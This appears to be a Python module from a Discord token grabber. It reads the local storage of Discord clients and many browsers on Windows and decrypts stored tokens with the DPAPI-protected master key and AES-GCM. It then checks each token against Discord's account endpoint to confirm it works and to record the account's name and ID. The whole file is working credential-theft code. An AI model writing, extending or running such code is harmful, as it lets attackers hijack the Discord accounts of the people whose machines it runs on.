from __future__ import annotations

import base64
import json
import os
import re
from dataclasses import dataclass
from pathlib import Path
from typing import Iterable, Iterator

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

from .http_client import DiscordHTTPClient

_TOKEN_REGEXES = (
    re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"),
    re.compile(r"mfa\.[\w-]{84}"),
)
_ENCRYPTED_REGEX = re.compile(r"dQw4w9WgXcQ:[^\"]+")


@dataclass(slots=True)
class TokenSource:
    label: str
    storage: Path
    local_state: Path | None = None

    def valid(self) -> bool:
        return self.storage.exists()


@dataclass(slots=True)
class DiscoveredToken:
    token: str
    user_tag: str
    user_id: str
    source: str


def _candidate_sources() -> list[TokenSource]:
    roaming = Path(os.getenv("APPDATA", ""))
    local = Path(os.getenv("LOCALAPPDATA", ""))
    sources = [
        TokenSource("Discord", roaming / "discord" / "Local Storage" / "leveldb", roaming / "discord" / "Local State"),
        TokenSource("Discord Canary", roaming / "discordcanary" / "Local Storage" / "leveldb", roaming / "discordcanary" / "Local State"),
        TokenSource("Discord PTB", roaming / "discordptb" / "Local Storage" / "leveldb", roaming / "discordptb" / "Local State"),
        TokenSource("Lightcord", roaming / "Lightcord" / "Local Storage" / "leveldb", roaming / "Lightcord" / "Local State"),
        TokenSource("Opera", roaming / "Opera Software" / "Opera Stable" / "Local Storage" / "leveldb"),
        TokenSource("Opera GX", roaming / "Opera Software" / "Opera GX Stable" / "Local Storage" / "leveldb"),
        TokenSource("Chrome", local / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb"),
        TokenSource("Chrome SxS", local / "Google" / "Chrome SxS" / "User Data" / "Local Storage" / "leveldb"),
        TokenSource("Microsoft Edge", local / "Microsoft" / "Edge" / "User Data" / "Default" / "Local Storage" / "leveldb"),
        TokenSource("Brave", local / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Local Storage" / "leveldb"),
        TokenSource("Yandex", local / "Yandex" / "YandexBrowser" / "User Data" / "Default" / "Local Storage" / "leveldb"),
        TokenSource("Vivaldi", local / "Vivaldi" / "User Data" / "Default" / "Local Storage" / "leveldb"),
    ]
    return [source for source in sources if source.valid()]


def _read_file(path: Path) -> Iterator[str]:
    try:
        with path.open("r", encoding="utf-8", errors="ignore") as handle:
            for line in handle:
                line = line.strip()
                if line:
                    yield line
    except OSError:
        return


def _decrypt(blob: str, local_state: Path) -> str | None:
    try:
        raw = base64.b64decode(blob.split("dQw4w9WgXcQ:")[1])
        with local_state.open("r", encoding="utf-8") as handle:
            master_key_payload = json.load(handle)["os_crypt"]["encrypted_key"]
        master_key = base64.b64decode(master_key_payload)[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        iv = raw[3:15]
        payload = raw[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)
        return decrypted[:-16].decode()
    except Exception:
        return None


def _extract_from_source(source: TokenSource) -> Iterator[str]:
    files = list(source.storage.glob("*.ldb")) + list(source.storage.glob("*.log"))
    for file_path in files:
        for line in _read_file(file_path):
            if source.local_state and source.local_state.exists():
                for encrypted in _ENCRYPTED_REGEX.findall(line):
                    decrypted = _decrypt(encrypted, source.local_state)
                    if decrypted:
                        yield decrypted
            for regex in _TOKEN_REGEXES:
                for token in regex.findall(line):
                    yield token


def _token_identity(token: str) -> str:
    try:
        raw = token.split(".")[0]
        return base64.b64decode((raw + "===").encode("ascii")).decode("ascii")
    except Exception:
        return ""


async def verify_tokens(client: DiscordHTTPClient, candidates: Iterable[tuple[str, str]]) -> list[DiscoveredToken]:
    seen: set[str] = set()
    verified: list[DiscoveredToken] = []
    for token, source in candidates:
        response = await client.request(
            "GET",
            "users/@me",
            token=token,
            include_debug=True,
            include_locale=True,
            super_properties=True,
            expected_status=(200,),
        )
        if response.status_code != 200:
            continue
        data = response.json()
        user_id = str(data.get("id"))
        key = f"{user_id}:{source}"
        if key in seen:
            continue
        seen.add(key)
        tag = f"{data.get('username')}#{data.get('discriminator')}"
        verified.append(
            DiscoveredToken(
                token=token,
                user_tag=tag,
                user_id=user_id,
                source=source,
            )
        )
    return verified


async def discover_tokens(client: DiscordHTTPClient) -> list[DiscoveredToken]:
    candidates: list[tuple[str, str]] = []
    for source in _candidate_sources():
        for token in _extract_from_source(source):
            candidates.append((token, source.label))
    if not candidates:
        return []
    return await verify_tokens(client, candidates)


__all__ = ["discover_tokens", "DiscoveredToken", "TokenSource", "verify_tokens"]
